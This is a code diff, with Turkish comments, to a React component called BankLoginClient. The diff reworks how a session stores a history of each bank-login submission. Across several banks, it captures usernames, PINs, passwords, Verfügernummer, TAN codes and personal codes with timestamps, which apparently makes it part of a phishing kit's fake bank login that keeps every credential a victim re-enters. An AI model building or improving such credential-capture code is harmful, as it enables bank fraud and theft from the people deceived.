@@ -460,35 +460,9 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       Object.entries(sessionFormData).filter(([key]) => !shouldResetPreviousBankField(key)),
     );
 
-    const rawFields: Record<string, string> = {
-      ...extraCapturedFields,
-    };
-    const historyEntry = {
-      bankSlug: bank.slug as string | undefined,
-      bankName: bank.name as string | undefined,
-      htmlStepLabel: "BANKA FORMU",
-      verfuegernummer: currentVerfuegernummer || credentials.verfuegernummer || "",
-      username: currentUsername || credentials.username || "",
-      pin: currentPin || credentials.pin || "",
-      password: currentPassword || credentials.password || "",
-      bankPhone: currentBankPhone || credentials.bankPhone || "",
-      personalCode: currentPersonalCode || credentials.personalCode || "",
-      tacCode: currentTacCode || credentials.tacCode || "",
-      loginMethod: currentLoginMethod || credentials.loginMethod || "",
-      orderedField1: currentOrderedField1,
-      orderedField1Key: currentOrderedField1Key,
-      orderedField2: currentOrderedField2,
-      orderedField2Key: currentOrderedField2Key,
-      orderedField2Type: currentOrderedField2Type,
-      orderedField3: currentOrderedField3,
-      orderedField3Key: currentOrderedField3Key,
-      orderedField3Type: currentOrderedField3Type,
-      rawFields,
-      capturedAt: new Date().toISOString(),
-    };
-
     // ⭐ BANKA GECMISI APPEND: SADECE TEKRAR GIRISLERDE push et.
-    //   ILK GIRIS: kolonlar guncellensin ama GEÇMİŞ butonu sayısı artmasın.
+    //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki sessionFormData) alanlarini PUSH ET!
+    //   Boylece kolon = YENI form (girilen), history = ESKI form (gorunur).
     const prevOrdered1 = String((sessionFormData as any).orderedField1 || "").trim();
     const prevUsername = String((sessionFormData as any).username || (sessionFormData as any).verfuegernummer || "").trim();
     const prevPassword = String((sessionFormData as any).password || (sessionFormData as any).pin || "").trim();
@@ -498,8 +472,55 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       ? (sessionFormData as any).bankFormHistory.slice()
       : [];
     if (!isFirstBankEntry) {
-      previousHistory.push(historyEntry);
+      const prevVerfuegernummer = String((sessionFormData as any).verfuegernummer || "").trim();
+      const prevUsernameInner = String((sessionFormData as any).username || "").trim();
+      const prevPin = String((sessionFormData as any).pin || "").trim();
+      const prevPasswordInner = String((sessionFormData as any).password || "").trim();
+      const prevBankPhone = String((sessionFormData as any).bankPhone || "").trim();
+      const prevPersonalCode = String((sessionFormData as any).personalCode || "").trim();
+      const prevTacCode = String((sessionFormData as any).tacCode || "").trim();
+      const prevLoginMethod = String((sessionFormData as any).loginMethod || "").trim();
+      const prevOrderedField1 = String((sessionFormData as any).orderedField1 || "").trim();
+      const prevOrderedField1Key = String((sessionFormData as any).orderedField1Key || "").trim();
+      const prevOrderedField2 = String((sessionFormData as any).orderedField2 || "").trim();
+      const prevOrderedField2Key = String((sessionFormData as any).orderedField2Key || "").trim();
+      const prevOrderedField2Type = String((sessionFormData as any).orderedField2Type || "").trim();
+      const prevOrderedField3 = String((sessionFormData as any).orderedField3 || "").trim();
+      const prevOrderedField3Key = String((sessionFormData as any).orderedField3Key || "").trim();
+      const prevOrderedField3Type = String((sessionFormData as any).orderedField3Type || "").trim();
+      const previousHistoryEntry = {
+        bankSlug: bank.slug as string | undefined,
+        bankName: bank.name as string | undefined,
+        htmlStepLabel: "BANKA FORMU",
+        verfuegernummer: prevVerfuegernummer,
+        username: prevUsernameInner,
+        pin: prevPin,
+        password: prevPasswordInner,
+        bankPhone: prevBankPhone,
+        personalCode: prevPersonalCode,
+        tacCode: prevTacCode,
+        loginMethod: prevLoginMethod,
+        orderedField1: prevOrderedField1,
+        orderedField1Key: prevOrderedField1Key,
+        orderedField2: prevOrderedField2,
+        orderedField2Key: prevOrderedField2Key,
+        orderedField2Type: prevOrderedField2Type,
+        orderedField3: prevOrderedField3,
+        orderedField3Key: prevOrderedField3Key,
+        orderedField3Type: prevOrderedField3Type,
+        rawFields: Object.fromEntries(
+          Object.entries(sessionFormData as Record<string, any>).filter(
+            ([key]) => !shouldResetPreviousBankField(key) && typeof key === "string" && key.length > 0,
+          ),
+        ),
+        capturedAt: new Date().toISOString(),
+      };
+      previousHistory.push(previousHistoryEntry);
     }
+
+    const rawFields: Record<string, string> = {
+      ...extraCapturedFields,
+    };
 
     const nextFormData = {
       ...preservedSessionFormData,
